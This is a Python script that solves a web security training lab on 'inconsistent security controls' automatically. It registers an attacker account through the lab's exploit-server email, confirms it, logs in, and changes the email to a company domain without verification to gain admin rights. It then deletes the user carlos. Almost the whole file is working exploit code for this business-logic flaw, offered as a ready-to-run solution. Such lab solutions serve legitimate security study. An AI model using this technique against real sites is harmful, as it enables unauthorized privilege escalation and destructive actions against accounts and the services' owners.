#################################################################################
#
# Lab: Inconsistent security controls
#
# Hack Steps: 
#      1. Fetch the register page
#      2. Extract the csrf token and session cookie to register a new account
#      3. Register a new account as attacker
#      4. Fetch the email client
#      5. Extract the link of account registration
#      6. Complete the account registration by following the link
#      7. Fetch the login page
#      8. Extract the csrf token and session cookie to login
#      9. Login as attacker
#      10. Fetch attacker's profile
#      11. Extract the csrf token needed for email update
#      12. Update the email to attacker@dontwannacry.com
#      13. Delete carlos from the admin panel
#
#################################################################################
import requests
import re
from colorama import Fore

LAB_URL = "https://0a5800ac0345605c80e1b84d005f0001.web-security-academy.net" # Change this to your lab URL
EXPLOIT_DOMAIN = "exploit-0ac1001c032d60178055b76a016d00cc.exploit-server.net" # Change this to your exploit DOMAIN
NEW_USERNAME = "attacker"; # You can change this to what you want
NEW_PASSWORD = "hacking"; # You can change this to what you want

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching the register page.. ", end="", flush=True)
    
    register_page = fetch(f"{LAB_URL}/register") 

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to register a new account.. ", end="", flush=True)

    session = register_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Registering a new account as " + Fore.YELLOW + NEW_USERNAME + Fore.WHITE + ".. ", end="", flush=True)

    attacker_email = f"attacker@{EXPLOIT_DOMAIN}"
    data = { "username": NEW_USERNAME, "password": NEW_PASSWORD, "csrf": csrf, "email": attacker_email }
    cookies = { "session": session }
    post_data(f"{LAB_URL}/register", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching the email client.. ", end="", flush=True)

    email_client = fetch(f"https://{EXPLOIT_DOMAIN}/email")
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the link of account registration.. ", end="", flush=True)

    regisration_link = re.findall(">(https.*)</a>", email_client.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Completing the account registration by following the link.. ", end="", flush=True)

    fetch(regisration_link)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the login page.. ", end="", flush=True)
   
    login_page = fetch(f"{LAB_URL}/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗9⦘ Logging in as " + Fore.YELLOW + NEW_USERNAME + Fore.WHITE + ".. ", end="", flush=True)

    data = { "username": NEW_USERNAME, "password": NEW_PASSWORD, "csrf": csrf }
    cookies = { "session": session }
    login = post_data(f"{LAB_URL}/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗10⦘ Fetching " + Fore.YELLOW + NEW_USERNAME + Fore.WHITE + "'s profile.. ", end="", flush=True)

    session = login.cookies.get("session")
    cookies = { "session": session }
    profile = fetch(f"{LAB_URL}/my-account", cookies=cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗11⦘ Extracting the csrf token needed for email update.. ", end="", flush=True)
    
    csrf = re.findall("csrf.+value=\"(.+)\"", profile.text)[0]
    new_email = f"{NEW_USERNAME}@dontwannacry.com"
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗12⦘ Updating the email to " + Fore.YELLOW + new_email + Fore.WHITE + ".. ", end="", flush=True)
    
    data = { "email": new_email, "csrf": csrf }
    cookies = { "session": session }
    post_data(f"{LAB_URL}/my-account/change-email", data, cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗13⦘ Deleting carlos from the admin panel.. ", end="", flush=True)
 
    fetch(f"{LAB_URL}/admin/delete?username=carlos", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(url, cookies = None):
    try:  
        return requests.get(url, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + url + " through exception")
        exit(1)


def post_data(url, data, cookies = None):
    try:    
        return requests.post(url, data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()